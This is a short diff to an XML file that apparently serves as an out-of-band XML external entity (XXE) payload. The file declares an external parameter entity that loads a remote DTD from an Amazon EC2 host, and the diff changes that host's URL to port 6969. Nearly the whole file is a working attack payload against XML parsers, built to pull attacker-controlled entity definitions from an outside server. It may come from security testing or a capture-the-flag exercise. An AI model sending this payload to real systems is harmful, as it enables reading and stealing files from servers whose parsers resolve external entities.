@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE foo [
    <!ELEMENT foo ANY>
-   <!ENTITY % rem1 SYSTEM "http://ec2-35-180-29-78.eu-west-3.compute.amazonaws.com/c-tool-f/xxe_jump_1">
+   <!ENTITY % rem1 SYSTEM "http://ec2-35-180-29-78.eu-west-3.compute.amazonaws.com:6969/xxe_jump_1">
    %rem1;
 ]>
 <lol>
